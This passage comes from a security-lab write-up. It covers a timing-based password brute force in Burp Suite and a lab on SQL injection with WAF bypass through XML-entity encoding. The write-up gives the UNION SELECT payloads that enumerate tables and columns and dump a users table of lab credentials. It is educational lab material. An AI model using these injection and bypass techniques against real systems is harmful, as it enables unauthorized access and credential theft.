- Setting attack type and payload position for full password brute force

- Attack type used is **Sniper**

- It will be done by manually incrementing the character position of the password due to the throttling issue in **Burp Suite Community Edition**

<br/>

![fcaf362f_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/21c893bf-6568-4165-ad60-4b7366ac5ef3)

- Payload set is an alphanumeric character set consisting only of lowercase letters and numbers

<br/>

<br/>

![c2045bb4_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/97393a34-4e2f-4c1f-9aae-1ecba9c4a512)

- Selecting a resource pool of 1 to accurately view the time delay in the responses during the password brute force

<br/>

<br/>

![109e922a_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/8fc81490-f9f2-4ee3-b4f3-ca0eff6cbc9c)

- Increment the character position of the password to brute force and repeat until getting the full password

- **Full password: 5bbvho721ioctyaynjyp**

<br/>

<br/>

![7400aeba_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/ff6cdd23-1b75-4b82-afec-7c1ed7505479)

![692a00d9_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/8876495b-6e9b-4869-a9b1-f830ce222140)

- **Successfully Logged in as Administrator**

<br/>

### Lab: SQL injection with filter bypass via XML encoding

**Vulnerability: **SQL Injection vulnerability in stock check feature

<br/>

![277b68a4_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/4c8d5cb6-bef4-4474-a855-c1febcf29bb7)

![35f435c0_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/0cf71276-7677-4483-8983-87def826ad18)

- Hackvertor extension is needed to obfuscate the payload using XML Entities

- This is done to bypass the WAF (Web Application Firewall) in place

<br/>

<br/>

![b38c8fa9_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/7caafeb8-4969-44ba-99fe-7a20fe389550)

- Vulnerable stock check feature on the web application

<br/>

<br/>

![cdb5ea9e_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/a6ac6c29-f287-4908-b124-57dba66b851e)

- Intercepted the stock check POST request

- Queries will be injected in the `storeID` tags

<br/>

![930264a1_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/69ab220a-7536-44ae-9169-0eebf36df07c)

- Performing basic addition operation for testing

<br/>

<br/>

![427b8e79_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/3eb71650-282e-4097-999b-028593ab1186)

**Query Injected:**


```sql
UNION SELECT NULL
```

- Testing using an SQL Injection for a basic Union Attack

- Attack was detected by the **Web Application Firewall (WAF)**

- **WAF **needs to be **bypassed **for the injection to work

<br/>

<br/>

![0b59028f_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/b912bc27-bbda-45a7-b862-a558e9614ac7)

- Using dec_entities to obfuscate the payload

- Encoding the SQL query in `dec_entities` or `hex_entities` in this case to bypass the **WAF**

<br/>

<br/>

![9694a1c3_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/0dc7611b-7eac-413a-ad35-3ecfdf74afbf)

- “null” being appearing in the response indicates that the query was successful

<br/>

<br/>

![1cf40ce1_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/568f816d-7084-4410-887c-b85de4e7940f)

**Query Injected:**


```sql
UNION SELECT table_name FROM information_schema.tables
```

- Dumped all the table names within the database

- Table containing user credentials is the** “users” **table

<br/>

<br/>

![95acc34a_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/a6aa3021-a092-4bd8-9735-1831444b2858)

**Query Injected:**


```sql
UNION SELECT column_name FROM information_schema.columns where table_name='users'
```

- Dumped all the columns names within the **users** table

- Columns found:

	- **password**

	- **username**

	<br/>

![a7edd1f2_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/ecd10136-4062-4df2-999a-eeeffe72cb11)

**Query Injected:**


```sql
UNION SELECT username || '::' || password FROM users
```

- Dumps all the user credentials from the **password **and **username **columns from the **users **table

- Usernames and passwords will be concatenated for easy viewing

- **User Credentials:**

 | **Username** | **Password** | 
 | ---- | ---- | 
 | administrator | k2g1cftjmx8shpqcilyp | 
 | carlos | 7qty2dot2r1ivuciil5b | 
 | wiener | 3pjuwbpfsyz6wpr9wnno | 

<br/>

![8d29fa3b_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/ed12bce9-2716-47d5-bc66-c5230b53b55e)

![ec17bdb5_Untitled](https://github.com/Fedwig/picoCTF2023-Writeup/assets/85858497/2b2d1fb0-7780-4ec2-ad8c-030a2d81fabe)

- **Successfully logged in as Administrator**

